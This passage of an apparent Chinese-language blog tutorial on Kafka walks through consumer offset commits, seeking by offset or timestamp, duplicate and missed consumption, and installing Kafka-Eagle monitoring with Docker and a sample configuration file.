class="code"><pre><span class="line"><span class="comment">// 是否自动提交 offset</span></span><br><span class="line">properties.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, <span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 提交 offset 的时间周期 1000ms，默认是5s</span></span><br><span class="line">properties.put(ConsumerConfig.AUTO_COMMIT_INTERVAL_MS_CONFIG, <span class="number">1000</span>);</span><br></pre></td></tr></table></figure><h3 id="手动提交-offset"><a href="#手动提交-offset" class="headerlink" title="手动提交 offset"></a>手动提交 offset</h3><p>虽然自动提交offset十分简单便利，但由于其是基于时间提交的，开发人员难以把握offset提交的时机。因此Kafka还提供了手动提交offset的API。</p><p>手动提交offset的方法有两种：</p><ul><li><p>commitSync（同步提交）：必须等待offset提交完毕，再去消费下一批数据。</p></li><li><p>commitAsync（异步提交） ：发送完提交offset请求后，就开始消费下一批数据了。</p></li></ul><p>两者的相同点是，都会将本次提交的一批数据最高的偏移量提交；不同点是，同步提交阻塞当前线程，一直到提交成功，并且会自动失败重试（由不可控因素导致，也会出现提交失败）；而异步提交则没有失败重试机制，故有可能提交失败。 </p><p><strong>同步提交 offset：</strong>由于同步提交 offset 有失败重试机制，故更加可靠，但是由于一直等待提交结果，提交的效率比较低。以下为同步提交 offset 的示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">CustomConsumerByHandSync</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"></span><br><span class="line">    properties.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, <span class="string">&quot;hadoop102:9092&quot;</span>);</span><br><span class="line">    <span class="comment">// 配置序列化 必须</span></span><br><span class="line">    properties.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());</span><br><span class="line">    properties.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());</span><br><span class="line">    <span class="comment">// 配置消费者组</span></span><br><span class="line">    properties.put(ConsumerConfig.GROUP_ID_CONFIG, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="comment">// 是否自动提交 offset</span></span><br><span class="line">    properties.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// 创建 kafka 消费者</span></span><br><span class="line">    KafkaConsumer&lt;String, String&gt; kafkaConsumer = <span class="keyword">new</span> <span class="title class_">KafkaConsumer</span>&lt;&gt;(properties);</span><br><span class="line">    <span class="comment">// 设置消费主题 形参是列表</span></span><br><span class="line">    kafkaConsumer.subscribe(Collections.singletonList(<span class="string">&quot;first&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// 读取消息</span></span><br><span class="line">        ConsumerRecords&lt;String, String&gt; consumerRecords = kafkaConsumer.poll(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; consumerRecord : consumerRecords) &#123;</span><br><span class="line">            System.out.println(consumerRecord);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 同步提交 offset</span></span><br><span class="line">        kafkaConsumer.commitSync();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>异步提交 offset：</strong>虽然同步提交 offset 更可靠一些，但是由于其会阻塞当前线程，直到提交成功。因此吞吐量会受到很大的影响。因此<strong>更多的情况下，会选用异步提交</strong> offset 的方式。以下为异步提交 offset 的示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">CustomConsumerByHandAsync</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"></span><br><span class="line">    properties.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, <span class="string">&quot;hadoop102:9092&quot;</span>);</span><br><span class="line">    <span class="comment">// 配置序列化 必须</span></span><br><span class="line">    properties.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());</span><br><span class="line">    properties.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());</span><br><span class="line">    <span class="comment">// 配置消费者组</span></span><br><span class="line">    properties.put(ConsumerConfig.GROUP_ID_CONFIG, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="comment">// 是否自动提交 offset</span></span><br><span class="line">    properties.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// 创建 kafka 消费者</span></span><br><span class="line">    KafkaConsumer&lt;String, String&gt; kafkaConsumer = <span class="keyword">new</span> <span class="title class_">KafkaConsumer</span>&lt;&gt;(properties);</span><br><span class="line">    <span class="comment">// 设置消费主题 形参是列表</span></span><br><span class="line">    kafkaConsumer.subscribe(Collections.singletonList(<span class="string">&quot;first&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// 读取消息</span></span><br><span class="line">        ConsumerRecords&lt;String, String&gt; consumerRecords = kafkaConsumer.poll(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; consumerRecord : consumerRecords) &#123;</span><br><span class="line">            System.out.println(consumerRecord);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 异步提交 offset</span></span><br><span class="line">        kafkaConsumer.commitAsync();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="指定-Offset-消费"><a href="#指定-Offset-消费" class="headerlink" title="指定 Offset 消费"></a>指定 Offset 消费</h3><p>auto.offset.reset &#x3D; earliest | latest | none 默认是 latest。 </p><p>当 Kafka 中没有初始偏移量（消费者组第一次消费）或服务器上不再存在当前偏移量时（例如该数据已被删除），该怎么办？ </p><p>（1）earliest：自动将偏移量重置为最早的偏移量，**–from-beginning**。 </p><p>（2）latest（<strong>默认值</strong>）：自动将偏移量重置为最新偏移量。</p><p>（3）none：如果未找到消费者组的先前偏移量，则向消费者抛出异常。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220315231605.png"></p><p>任意指定 offset 位移开始消费（注意：每次执行完，需要修改消费者组名）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">CustomConsumerSeek</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"></span><br><span class="line">    properties.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, <span class="string">&quot;hadoop102:9092&quot;</span>);</span><br><span class="line">    <span class="comment">// 配置序列化 必须</span></span><br><span class="line">    properties.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());</span><br><span class="line">    properties.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());</span><br><span class="line">    <span class="comment">// 配置消费者组</span></span><br><span class="line">    properties.put(ConsumerConfig.GROUP_ID_CONFIG, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="comment">// 创建 kafka 消费者</span></span><br><span class="line">    KafkaConsumer&lt;String, String&gt; kafkaConsumer = <span class="keyword">new</span> <span class="title class_">KafkaConsumer</span>&lt;&gt;(properties);</span><br><span class="line">    <span class="comment">// 设置消费主题 形参是列表</span></span><br><span class="line">    kafkaConsumer.subscribe(Collections.singletonList(<span class="string">&quot;first&quot;</span>));</span><br><span class="line"></span><br><span class="line">    Set&lt;TopicPartition&gt; assignment = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span> (assignment.size() == <span class="number">0</span>) &#123;</span><br><span class="line">        kafkaConsumer.poll(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line">        <span class="comment">// 获取消费者分区分配信息（有了分区分配信息才能开始消费）</span></span><br><span class="line">        assignment = kafkaConsumer.assignment();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 遍历所有分区，并指定 offset 从 1700 的位置开始消费</span></span><br><span class="line">    <span class="keyword">for</span> (TopicPartition tp : assignment) &#123;</span><br><span class="line">        kafkaConsumer.seek(tp, <span class="number">1700</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// 读取消息</span></span><br><span class="line">        ConsumerRecords&lt;String, String&gt; consumerRecords = kafkaConsumer.poll(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; consumerRecord : consumerRecords) &#123;</span><br><span class="line">            System.out.println(consumerRecord);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="指定时间消费"><a href="#指定时间消费" class="headerlink" title="指定时间消费"></a>指定时间消费</h3><p>需求：在生产环境中，会遇到最近消费的几个小时数据异常，想重新按照时间消费。</p><p>例如要求按照时间消费前一天的数据，怎么处理？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">CustomConsumerForTime</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Properties</span> <span class="variable">properties</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"></span><br><span class="line">    properties.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, <span class="string">&quot;hadoop102:9092&quot;</span>);</span><br><span class="line">    <span class="comment">// 配置序列化 必须</span></span><br><span class="line">    properties.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());</span><br><span class="line">    properties.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class.getName());</span><br><span class="line">    <span class="comment">// 配置消费者组</span></span><br><span class="line">    properties.put(ConsumerConfig.GROUP_ID_CONFIG, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="comment">// 是否自动提交 offset</span></span><br><span class="line">    properties.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, <span class="literal">false</span>);</span><br><span class="line">    <span class="comment">// 创建 kafka 消费者</span></span><br><span class="line">    KafkaConsumer&lt;String, String&gt; kafkaConsumer = <span class="keyword">new</span> <span class="title class_">KafkaConsumer</span>&lt;&gt;(properties);</span><br><span class="line">    <span class="comment">// 设置消费主题 形参是列表</span></span><br><span class="line">    kafkaConsumer.subscribe(Collections.singletonList(<span class="string">&quot;first&quot;</span>));</span><br><span class="line"></span><br><span class="line">    Set&lt;TopicPartition&gt; assignment = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span> (assignment.size() == <span class="number">0</span>) &#123;</span><br><span class="line">        kafkaConsumer.poll(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line">        <span class="comment">// 获取消费者分区分配信息（有了分区分配信息才能开始消费）</span></span><br><span class="line">        assignment = kafkaConsumer.assignment();</span><br><span class="line">    &#125;</span><br><span class="line">    HashMap&lt;TopicPartition, Long&gt; timestampToSearch = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="comment">// 封装集合存储，每个分区对应一天前的数据</span></span><br><span class="line">    <span class="keyword">for</span> (TopicPartition topicPartition : assignment) &#123;</span><br><span class="line">        timestampToSearch.put(topicPartition, System.currentTimeMillis() - <span class="number">1</span> * <span class="number">24</span> * <span class="number">3600</span> * <span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取从 1 天前开始消费的每个分区的 offset</span></span><br><span class="line">    Map&lt;TopicPartition, OffsetAndTimestamp&gt; offsets = kafkaConsumer.offsetsForTimes(timestampToSearch);</span><br><span class="line">    <span class="comment">// 遍历每个分区，对每个分区设置消费时间。</span></span><br><span class="line">    <span class="keyword">for</span> (TopicPartition topicPartition : assignment) &#123;</span><br><span class="line">        <span class="type">OffsetAndTimestamp</span> <span class="variable">offsetAndTimestamp</span> <span class="operator">=</span> offsets.get(topicPartition);</span><br><span class="line">        <span class="comment">// 根据时间指定开始消费的位置</span></span><br><span class="line">        <span class="keyword">if</span> (offsetAndTimestamp != <span class="literal">null</span>) &#123;</span><br><span class="line">            kafkaConsumer.seek(topicPartition, offsetAndTimestamp.offset());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// 读取消息</span></span><br><span class="line">        ConsumerRecords&lt;String, String&gt; consumerRecords = kafkaConsumer.poll(Duration.ofSeconds(<span class="number">1</span>));</span><br><span class="line">        <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; consumerRecord : consumerRecords) &#123;</span><br><span class="line">            System.out.println(consumerRecord);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏消费和重复消费"><a href="#漏消费和重复消费" class="headerlink" title="漏消费和重复消费"></a>漏消费和重复消费</h2><p><strong>重复消费：</strong>已经消费了数据，但是 offset 没提交。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220316232534.png"></p><p><strong>漏消费：</strong>设置offset为手动提交，当offset被提交时，数据还在内存中未落盘，此时刚好消费者线程被kill掉，那么offset已经提交，但是数据未处理，导致这部分内存中的数据丢失。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220316232709.png"></p><p>如果想完成Consumer端的精准一次性消费，那么需要Kafka消费端将消费过程和提交offset过程做<strong>原子绑定</strong>。此时我们需要将Kafka的offset保存到支持事务的自定义介质（比如MySQL）。这部分知识会在后续项目部分涉及。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220316232839.png"></p><h2 id="数据积压"><a href="#数据积压" class="headerlink" title="数据积压"></a>数据积压</h2><ul><li>如果是Kafka消费能力不足，则可以考虑增加Topic的分区数，并且同时提升消费组的消费者数量，消费者数 &#x3D; 分区数。（两者缺一不可） </li><li>如果是下游的数据处理不及时：提高每批次拉取的数量。批次拉取数据过少（拉取数据&#x2F;处理时间 &lt; 生产速度），使处理的数据小于生产的数据，也会造成数据积压。</li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220316233043.png"></p><h1 id="Kafka监控"><a href="#Kafka监控" class="headerlink" title="Kafka监控"></a>Kafka监控</h1><p>Kafka-Eagle 框架可以监控 Kafka 集群的整体运行情况，在生产环境中经常使用。</p><h2 id="其他环境准备"><a href="#其他环境准备" class="headerlink" title="其他环境准备"></a>其他环境准备</h2><p> <strong>MySQL 环境准备：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 3306:3306 --name mysql </span><br><span class="line">-v /root/mysql/conf:/etc/mysql/conf.d </span><br><span class="line">-v /root/mysql/logs:/logs </span><br><span class="line">-v /root/mysql/data:/var/lib/mysql </span><br><span class="line">-e MYSQL_ROOT_PASSWORD=123456 </span><br><span class="line">-d mysql</span><br></pre></td></tr></table></figure><p><strong>Zookeeper环境准备：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker run -d</span><br><span class="line">-p 2181:2181</span><br><span class="line">-v /root/zookeeper/data/:/data/</span><br><span class="line">--name=zookeeper</span><br><span class="line">--privileged zookeeper</span><br></pre></td></tr></table></figure><p><strong>Kafka 环境准备：</strong></p><p>修改&#x2F;opt&#x2F;kafka&#x2F;bin&#x2F;kafka-server-start.sh 命令中的配置（可选，如果kafka启动不了，根目录有hs_err_pid的log，大概率是内存，可将启动脚本中堆内存参数改小，或者增加服务器内存，EKAF启动同理）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if [ &quot;x$KAFKA_HEAP_OPTS&quot; = &quot;x&quot; ]; then</span><br><span class="line"> export KAFKA_HEAP_OPTS=&quot;-server -Xms2G -Xmx2G -XX:PermSize=128m -XX:+UseG1GC -XX:MaxGCPauseMillis=200 -XX:ParallelGCThreads=8 -XX:ConcGCThreads=5 -XX:InitiatingHeapOccupancyPercent=70&quot;</span><br><span class="line"> export JMX_PORT=&quot;9999&quot;</span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash"><span class="built_in">export</span> KAFKA_HEAP_OPTS=<span class="string">&quot;-Xmx1G -Xms1G&quot;</span></span></span><br><span class="line"><span class="meta prompt_"> #</span><span class="language-bash"><span class="built_in">export</span> KAFKA_HEAP_OPTS=<span class="string">&quot;-Xmx256M -Xms128M&quot;</span> <span class="comment">#启动不了可以这样设置，efak也可以改</span></span></span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h2 id="Kafka-Eagle-安装"><a href="#Kafka-Eagle-安装" class="headerlink" title="Kafka-Eagle 安装"></a>Kafka-Eagle 安装</h2><ul><li><p>官网：<a href="https://www.kafka-eagle.org/">https://www.kafka-eagle.org/</a></p></li><li><p>上传压缩包 kafka-eagle-bin-2.1.0.tar.gz 到集群&#x2F;root&#x2F;software 目录</p></li><li><p>解压到opt目录：</p></li></ul><p><code>[root@nanzx kafka-eagle-bin-2.1.0]# tar -zxvf kafka-eagle-bin-2.1.0.tar.gz -C /opt/</code></p><ul><li>进入刚才解压后的目录继续解压：</li></ul><p><code>[root@nanzx kafka-eagle-bin-2.1.0]# tar -zxvf efak-web-2.1.0-bin.tar.gz -C /opt/</code></p><ul><li>修改名称</li></ul><p><code>[root@nanzx kafka-eagle-bin-2.1.0]# mv efak-web-2.1.0 efak</code></p><ul><li>修改配置文件 &#x2F;opt&#x2F;module&#x2F;efak&#x2F;conf&#x2F;system-config.properties</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment"># multi zookeeper &amp; kafka cluster list</span></span><br><span class="line"><span class="comment"># Settings prefixed with &#x27;kafka.eagle.&#x27; will be deprecated, use &#x27;efak.&#x27; instead</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="attr">efak.zk.cluster.alias</span>=<span class="string">cluster1</span></span><br><span class="line"><span class="attr">cluster1.zk.list</span>=<span class="string">192.168.2.110:2181,192.168.2.111:2181,192.168.2.112:2181</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment"># zookeeper enable acl</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="attr">cluster1.zk.acl.enable</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">cluster1.zk.acl.schema</span>=<span class="string">digest</span></span><br><span class="line"><span class="attr">cluster1.zk.acl.username</span>=<span class="string">test</span></span><br><span class="line"><span class="attr">cluster1.zk.acl.password</span>=<span class="string">test123</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment"># broker size online list</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="attr">cluster1.efak.broker.size</span>=<span class="string">20</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment"># zk client thread limit</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="attr">kafka.zk.limit.size</span>=<span class="string">16</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment"># EFAK webui port</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="attr">efak.webui.port</span>=<span class="string">8048</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment"># EFAK enable distributed</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="attr">efak.distributed.enable</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">efak.cluster.mode.status</span>=<span class="string">master</span></span><br><span class="line"><span class="attr">efak.worknode.master.host</span>=<span class="string">localhost</span></span><br><span class="line"><span class="attr">efak.worknode.port</span>=<span class="string">8085</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment"># kafka jmx acl and ssl authenticate</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="attr">cluster1.efak.jmx.acl</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">cluster1.efak.jmx.user</span>=<span class="string">keadmin</span></span><br><span class="line"><span class="attr">cluster1.efak.jmx.password</span>=<span class="string">keadmin123</span></span><br><span class="line"><span class="attr">cluster1.efak.jmx.ssl</span>=<span class="string">false</span></span><br><span class="line"><span class="attr">cluster1.efak.jmx.truststore.location</span>=<span class="string">/data/ssl/certificates/kafka.truststore</span></span><br><span class="line"><span class="attr">cluster1.efak.jmx.truststore.password</span>=<span class="string">ke123456</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment"># kafka offset storage</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="attr">cluster1.efak.offset.storage</span>=<span class="string">kafka</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment"># kafka jmx uri</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="attr">cluster1.efak.jmx.uri</span>=<span class="string">service:jmx:rmi:///jndi/rmi://%s/jmxrmi</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment"># kafka metrics, 15 days by default</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="attr">efak.metrics.charts</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">efak.metrics.retain</span>=<span class="string">15</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment"># kafka sql topic records max</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="attr">efak.sql.topic.records.max</span>=<span class="string">5000</span></span><br><span class="line"><span class="attr">efak.sql.topic.preview.records.max</span>=<span class="string">10</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment"># delete kafka topic token</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="attr">efak.topic.token</span>=<span class="string">keadmin</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment"># 